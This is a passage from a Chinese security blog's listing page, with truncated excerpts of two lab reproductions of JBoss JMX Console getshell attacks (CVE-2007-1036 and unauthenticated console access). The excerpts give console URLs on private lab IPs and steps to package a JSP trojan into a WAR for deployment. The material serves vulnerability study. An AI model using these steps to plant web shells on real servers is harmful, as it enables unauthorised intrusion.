<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>输入url:<a target="_blank" rel="noopener" href="http://172.26.1.169:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository">http://172.26.1.169:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository</a>,定位到store方法</p>
<p><img src="/resource/(CVE-2007-1036)JBossJMXConsoleHtmlAdaptorGetshell/media/rId25.png"></p>
<p>传入相应的值，即可getshell</p>
<p><img src="/resource/(CVE-2007-1036)JBossJMXConsoleHtmlAdaptorGetshell/media/rId26.png"></p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Jboss/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%B8%8D%E4%B8%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2007-1036%EF%BC%89JBoss%20JMX%20Console%20HtmlAdaptor%20Getshell/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jboss/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%B8%8D%E4%B8%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2007-1036%EF%BC%89JBoss%20JMX%20Console%20HtmlAdaptor%20Getshell/" data-id="cl5c2qrtz00azy8v1hxwmeqoc" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Jboss/访问控制不严导致的漏洞/JBoss JMX Console未授权访问Getshell" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Jboss/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%B8%8D%E4%B8%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BC%8F%E6%B4%9E/JBoss%20JMX%20Console%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEGetshell/" class="article-date">
  <time datetime="2022-07-08T06:25:57.784Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="JBoss-JMX-Console未授权访问Getshell"><a href="#JBoss-JMX-Console未授权访问Getshell" class="headerlink" title="JBoss JMX Console未授权访问Getshell"></a>JBoss JMX Console未授权访问Getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>全版本</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>先输入<a target="_blank" rel="noopener" href="http://172.26.1.167:8080/jmx-console/">http://172.26.1.167:8080/jmx</a>-console/<a target="_blank" rel="noopener" href="http://172.26.1.167:8080/jmx-console/">null-console/</a>进入到页面</p>
<ul>
<li>  先点击<a target="_blank" rel="noopener" href="http://172.26.1.167:8080/jmx-console/HtmlAdaptor?action=displayMBeans&filter=jboss.system">jboss.system</a>,然后点击<a target="_blank" rel="noopener" href="http://172.26.1.167:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:service=MainDeployer">service=MainDeployer</a></li>
</ul>
<p><img src="/resource/JBossJMXConsole%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEGetshell/media/rId27.png"></p>
<blockquote>
<p>创建一个war包</p>
</blockquote>
<p>先准备好一个jsp的木马,然后打开cmd创建,输入命令:jar -cvf<br>zfsn.war(你要创建war的名字，可随意填) zfsn. jsp</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Jboss/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%B8%8D%E4%B8%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BC%8F%E6%B4%9E/JBoss%20JMX%20Console%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEGetshell/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Jboss/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%B8%8D%E4%B8%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BC%8F%E6%B4%9E/JBoss%20JMX%20Console%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEGetshell/" data-id="cl5c2qrty00ayy8v16iktgupi" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/67/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/66/">66</a><a class="page-number" href="/page/67/">67</a><span class="page-number current">68</span><a class="page-number" href="/page/69/">69</a><a class="page-number" href="/page/70/">70</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/69/">下一页</a>
    </nav>
  
</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>